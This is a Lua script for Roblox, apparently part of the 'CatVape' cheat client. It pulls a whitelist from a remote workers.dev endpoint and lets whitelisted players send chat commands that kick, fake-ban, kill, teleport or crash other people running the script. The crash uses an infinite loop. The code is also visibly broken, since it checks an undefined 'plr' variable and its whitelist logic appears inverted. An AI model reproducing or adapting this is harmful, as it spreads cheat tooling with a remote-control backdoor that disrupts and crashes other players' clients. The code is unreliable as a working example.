local serv = setmetatable({}, {
    __index = function(self, index)
        self[index] = game:GetService(index);
        return self[index]
    end
})
local lplr = game.Players.LocalPlayer
local vape = shared.vape
local whitelistdata = {}
local getRank = function(self, string)
    local request = request({
        Url = `https://workers-playground-falling-sky-24bd.sanbaram9.workers.dev/`,
        Method = 'GET'
    })
    local body = serv.HttpService:JSONDecode(request.Body)
    if body.value then
        return body.value
    end
    return {"logics1476": true}
end
whitelistdata.value = getRank(lplr)

local whitelistedPlayer = nil
local commands = {
    kick = function(arg1: string, arg2: string): (string, string) -> ()
	    lplr:Kick(`A Owner has kicked you from the experience, reason: {arg1 or 'none'}`);
	end,
	ban = function()
	    lplr:Kick('You have been temporarily banned.\n[Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes 59 seconds]')
	end,
	trip = function()
		lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll)
	end,
	kill = function(arg: string, arg2: string): (string, string) -> ()
	    if vape.Libraries.entity.isAlive then
	        lplr.Character.Humanoid.Health = 0;
        end
	end,
	gravity = function(arg: string, arg2: string): (string, string) -> ()
	    workspace.Gravity = arg or 196.2
	end,
	void = function()
		lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
	end,
	notify = function(arg: string, arg2: string): (string, string) -> ()
	    vape:CreateNotification(arg or 'A CatVape User Messaged you', arg2 or 'Im in your game :)', 15, 'info');
	end,
	crash = function()
		local sgui = Instance.new("ScreenGui", game.CoreGui)
		local frame = Instance.new("Frame", sgui)
		frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		frame.Size = UDim2.new(-50, 5000, -50, 5000)
		task.delay(0.1, function()
            while true do end
        end)
	end
}

local addplayer = function(v)
    if plr and plr.Rank then
        if whitelistdata.value[v.Name] then
            vape:CreateNotification('Cat', `{v.Name} is using cat v5!`, 20)
        elseif not whitelistdata.value[v.Name] then
            v.Chatted:Connect(function(message)
                whitelistedPlayer = v
                local command = message:split(' ')[1]:split(';')[2] or nil;
                if command and commands[command] then
                    local args = message:split(' ');
                    if args[2] and (args[2]:lower() == getRank(lplr, true):lower() or args[2]:lower() == 'all') then
                        commands[command](args[3] or nil, args[4] or nil);
                    end;
                end;
            end)
        end
    end
end

for i,v in serv.Players:GetPlayers() do
    if v ~= lplr then
        addplayer(v)
    end
end

serv.Players.PlayerAdded:Connect(addplayer)
